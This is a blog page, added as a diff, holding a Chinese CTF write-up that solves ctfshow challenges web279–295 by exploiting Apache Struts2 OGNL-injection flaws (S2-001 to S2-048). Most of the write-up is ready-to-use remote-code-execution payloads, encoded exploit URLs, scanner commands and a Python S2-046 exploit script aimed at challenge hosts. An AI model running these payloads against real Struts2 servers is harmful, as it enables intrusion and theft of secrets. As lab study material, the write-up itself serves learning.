@@ -1,0 +1,350 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Web入门_java | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="web279-300">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web入门_java">
+<meta property="og:url" content="https://4reexile.github.io/article/ctfshow-webbasic-java/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="web279-300">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2024-09-21T13:48:45.000Z">
+<meta property="article:modified_time" content="2024-09-21T13:55:09.336Z">
+<meta property="article:author" content="Creexile">
+<meta property="article:tag" content="漏洞利用">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/ctfshow-webbasic-java/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Web入门_java',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-09-21 21:55:09'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Web入门_java</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-09-21T13:48:45.000Z" title="Created 2024-09-21 21:48:45">2024-09-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-09-21T13:55:09.336Z" title="Updated 2024-09-21 21:55:09">2024-09-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctfshow%E9%9D%B6%E5%9C%BA/">ctfshow靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2.8k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>java</h1>
+<hr>
+<blockquote>
+<p>提示: 平台似乎有过滤, 所以提示其实是<code>echo $FLAG</code>, 直接执行这个可能就能输出flag; 但是不是很稳定, 如果不行还是使用<code>env</code></p>
+<p>给出的payload都没有经过编码, 可能需要自己编码</p>
+<p>说是java, 其实是struts2漏洞合集吧, 主要不是做题的, 其实是学代码审计的</p>
+</blockquote>
+<h2 id="web279"><a class="header-anchor" href="#web279">¶</a>web279</h2>
+<ul>
+<li>描述: echo FLAG</li>
+</ul>
+<p>只有跳转链接(戳那个where is flag), 查看源码看到提示(?)S2-001, 这是一个struts2漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/224041.html">Vulhub漏洞系列：struts2漏洞 S2-001</a>, <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-001/README.zh-cn.md">vulhub漏洞库_struts2</a></p>
+<p>已经是非常详细了, 漏洞也非常的简单</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br><span class="line"></span><br><span class="line"># 很急, 找了半天找不到flag于是输出环境变量, 有了</span><br><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web280"><a class="header-anchor" href="#web280">¶</a>web280</h2>
+<ul>
+<li>描述: echo FLAG 即可</li>
+</ul>
+<p>查源码, 点击跳转发现提示是S2-005</p>
+<p>参考资料: <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/701942652">Struts2-005漏洞分析(CVE-2010-1870)</a>, <a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/193078.html">Struts2-005远程代码执行漏洞分析</a></p>
+<blockquote>
+<p>payload不好用</p>
+</blockquote>
+<p>拉倒了, 不如直接去下载一个现成的脚本跑</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Vancomycin-g/Struts2Scan">Struts2Scan</a>, 可以用py也可以直接打开jar文件(那是一个程序)扫描</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 .\Struts2Scan.py -u  https://7bb5c5c0-b262-40d3-8ee0-e1d47d58ed14.challenge.ctf.show/S2-005/example/HelloWorld.action</span><br><span class="line"><span class="comment"># 利用方式如下, 再输入env即可</span></span><br><span class="line">python3 .\Struts2Scan.py -u  https://7bb5c5c0-b262-40d3-8ee0-e1d47d58ed14.challenge.ctf.show/S2-005/example/HelloWorld.action -n S2-005 --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240920221137757.png" alt="image-20240920221137757"></p>
+<h2 id="web281"><a class="header-anchor" href="#web281">¶</a>web281</h2>
+<ul>
+<li>描述: echo FLAG</li>
+</ul>
+<p>点击跳转发现url提示是S2-007, 而且能提交的数据不是username和password而是name, age和email; 参数不对肯定扫不出来, 我们设置一下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 .\Struts2Scan.py -u https://208910ad-e478-4dd1-a1f8-83459a38ca57.challenge.ctf.show/S2-007/user.action -d name=1&amp;&amp;email=1&amp;&amp;age=1</span><br><span class="line"><span class="comment"># 利用如下, 同样输入env</span></span><br><span class="line">python3 .\Struts2Scan.py -u https://208910ad-e478-4dd1-a1f8-83459a38ca57.challenge.ctf.show/S2-007/user.action -n S2-016 --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure>
+<p>结果扫出来是S2-016, 不是很懂反正能用就行</p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921144747121.png" alt="image-20240921144747121"></p>
+<p>然后去找了S2-007的漏洞, <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-007/README.zh-cn.md">vulhub漏洞库_s2-007</a>, 在age处输入, 回显也在age处</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="web282"><a class="header-anchor" href="#web282">¶</a>web282</h2>
+<ul>
+<li>描述: echo FLAG</li>
+</ul>
+<p>跳转后url提示是S2-008, 可以从<code>./cookie.jsp</code>或者<code>./devmode.jsp</code>入手</p>
+<p>如果要获得flag, 直接用扫描工具访问并扫描这两个网址就可以了, 详细信息请看<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-008/README.zh-cn.md">vulhub漏洞库_s2-008</a></p>
+<h2 id="web283"><a class="header-anchor" href="#web283">¶</a>web283</h2>
+<ul>
+<li>描述: Struts2 showcase远程代码执行漏洞</li>
+</ul>
+<p><code>CVE-2013-1965</code>?, 你不是<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-009/README.zh-cn.md">s2-009</a>?</p>
+<p>访问下面的url地址就能读取到env</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-009/ajax/example5?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27env%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure>
+<h2 id="web284"><a class="header-anchor" href="#web284">¶</a>web284</h2>
+<ul>
+<li>描述: 无</li>
+</ul>
+<p>提示为s2-012, 网址我就不放了, 你直接在github打开呗</p>
+<p>payload如下, 直接塞进那个框然后抓包即可</p>
+<blockquote>
+<p>这何尝不是另一种脚本小子</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921153131317.png" alt="image-20240921153131317"></p>
+<h2 id="web285"><a class="header-anchor" href="#web285">¶</a>web285</h2>
+<ul>
+<li>描述: 无</li>
+</ul>
+<p>提示s2-013; Try add some parameters in URL</p>
+<p>s2-013poc如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-013/link.action?a=$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web286"><a class="header-anchor" href="#web286">¶</a>web286</h2>
+<ul>
+<li>描述: 无</li>
+</ul>
+<p>提示: s2-015</p>
+<p>我尝试了可以用的payload, 但是显示env不全, FLAG没出来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-015/$&#123;#context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream()),#q&#125;.action</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921163506207.png" alt="image-20240921163506207"></p>
+<p>还是用工具快:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 .\Struts2Scan.py -u https://660ecde4-19ff-49d8-8a3b-f77b26e45bbd.challenge.ctf.show/S2-015/welcome.action</span><br><span class="line"><span class="comment"># 扫出来三个, 随便用一个得了</span></span><br><span class="line">python3 .\Struts2Scan.py -u https://660ecde4-19ff-49d8-8a3b-f77b26e45bbd.challenge.ctf.show/S2-015/welcome.action -n S2-016 --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure>
+<h2 id="web287"><a class="header-anchor" href="#web287">¶</a>web287</h2>
+<ul>
+<li>描述: 无</li>
+</ul>
+<p>提示: s6-016; Use “action:”, “redirect:”, “redirectAction:” in ./default.action</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-016/default.action?redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;env&quot;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921164428208.png" alt="image-20240921164428208"></p>
+<h2 id="web288"><a class="header-anchor" href="#web288">¶</a>web288</h2>
+<ul>
+<li>描述: 无</li>
+</ul>
+<p>提示: S2-019</p>
+<p>复现是s2-008, 甚至poc都差不多</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27env%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A</span><br></pre></td></tr></table></figure>
+<h2 id="web289"><a class="header-anchor" href="#web289">¶</a>web289</h2>
+<ul>
+<li>描述: 无</li>
+</ul>
+<p>提示: S2-029; add “message” param in url</p>
+<p>出问题了, 找了好几个payload用不了, 那就用工具吧</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 .\Struts2Scan.py -u https://3e2cec0b-d431-4809-b4f9-82e49c17f631.challenge.ctf.show/S2-029/</span><br><span class="line"><span class="comment"># 利用</span></span><br><span class="line">python3 .\Struts2Scan.py -u https://3e2cec0b-d431-4809-b4f9-82e49c17f631.challenge.ctf.show/S2-029/ -n S2-045 --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure>
+<h2 id="web290"><a class="header-anchor" href="#web290">¶</a>web290</h2>
+<ul>
+<li>描述: 无</li>
+</ul>
+<p>提示: s2-032</p>
+<p>打开一个界面, 直接套用github上的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-032/memoshow.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=env </span><br></pre></td></tr></table></figure>
+<h2 id="web291"><a class="header-anchor" href="#web291">¶</a>web291</h2>
+<ul>
+<li>描述: 无</li>
+</ul>
+<p>提示: s2-033, 其实是是<code>s2-045</code>, 或者<code>s2-037</code>, 直接搜索&quot;struts2  /orders/3&quot;就能找到</p>
+<p>给个找到的例子, 进去直接搜索/orders/3: <a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1160444">https://developer.aliyun.com/article/1160444</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-033/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</span><br></pre></td></tr></table></figure>
+<h2 id="web292"><a class="header-anchor" href="#web292">¶</a>web292</h2>
+<ul>
+<li>描述: 无</li>
+</ul>
+<p><code>S2-037</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://837cc0c1-04ff-4c2f-bbf5-4c4b172436b6.challenge.ctf.show/S2-037/orders/3/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=16456&amp;command=env</span><br></pre></td></tr></table></figure>
+<h2 id="web293"><a class="header-anchor" href="#web293">¶</a>web293</h2>
+<ul>
+<li>描述: 无</li>
+</ul>
+<p><code>S2-045</code>, 看github, 塞在Content-Type发出去</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;env&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="web294"><a class="header-anchor" href="#web294">¶</a>web294</h2>
+<ul>
+<li>描述: 无</li>
+</ul>
+<p><code>S2-046</code>, <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/221?time__1311=eqIx0DyGG%3DemqGKDtD%2FQnx4YuRa%2BzDcDhoD">找到的博客</a></p>
+<p>这次漏洞的触发点在Content-Length和Content-Disposition字段的filename中, 但是你说的对, python真好用</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sugarcrm</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">poctest</span>(<span class="params">self</span>):   </span><br><span class="line">        boundary=<span class="string">&quot;---------------------------735323031399963166993862150&quot;</span></span><br><span class="line">        paylaod=<span class="string">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;env&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span></span><br><span class="line">        url = <span class="string">&#x27;http://200258f8-842d-4e4b-a894-ea043fd0d046.challenge.ctf.show/S2-046/doUpload.action&#x27;</span></span><br><span class="line">        headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;multipart/form-data; boundary=&#x27;</span>+boundary+<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">        data =<span class="string">&quot;--&quot;</span>+boundary+<span class="string">&quot;\r\nContent-Disposition: form-data; name=\&quot;foo\&quot;; filename=\&quot;&quot;</span>+paylaod+<span class="string">&quot;\0b\&quot;\r\nContent-Type: text/plain\r\n\r\nx\r\n--&quot;</span>+boundary+<span class="string">&quot;--&quot;</span></span><br><span class="line">        rs=requests.post(url, headers=headers,data=data)</span><br><span class="line">        <span class="built_in">print</span>(rs.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test = Sugarcrm()</span><br><span class="line">    test.poctest()</span><br></pre></td></tr></table></figure>
+<h2 id="web295"><a class="header-anchor" href="#web295">¶</a>web295</h2>
+<ul>
+<li>描述: 无</li>
+</ul>
+<p><code>S2-048</code>, 直接看github有更详细的步骤</p>
+<p>报错界面上那个Message爆出来的number后面就是flag</p>
